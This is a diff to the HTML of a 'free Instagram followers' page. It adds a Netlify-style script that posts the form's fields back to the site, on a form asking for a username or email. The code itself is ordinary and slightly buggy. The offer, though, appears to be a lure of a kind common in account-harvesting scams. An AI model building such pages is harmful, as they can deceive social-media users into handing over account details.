@@ -7,6 +7,26 @@
     <link rel="stylesheet" href="css/style.css">
     <link rel="stylesheet" href="css/media.css">
     <title>4llowersmax | free-instagram-followers </title>
+    <script>
+            const handleSubmit = (event) => {
+        event.preventDefault();
+      
+        const myForm = event.target;
+        const formData = new FormData(myForm);
+        
+        fetch("/", {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams(formData).toString(),
+        })
+          .then(() => console.log("Form successfully submitted"))
+          .catch((error) => alert(error));
+      };
+      
+      document
+        .querySelector("form")
+        .addEventListener("submit", handleSubmit);
+    </script>
 </head>
 <body>
     <header id="header">
@@ -84,7 +104,7 @@
     <div class="welcome">
         <h2 class="m-head">Free Instagram Followers</h2>
         <div class="line-bottom"></div>
-        <form id="form" data-nelify="true", method="post" action="" onsubmit=" {handleSubmit} redirectToAnotherPage(); return false;" >
+        <form id="form" data-nelify="true" name="myForm" method="post" action="" netlify >
             <input type="hidden" name="form-name">
             <h2 class="m-head result-head">Get 50 followers for free</h2>
             <label for="name">Username/Email
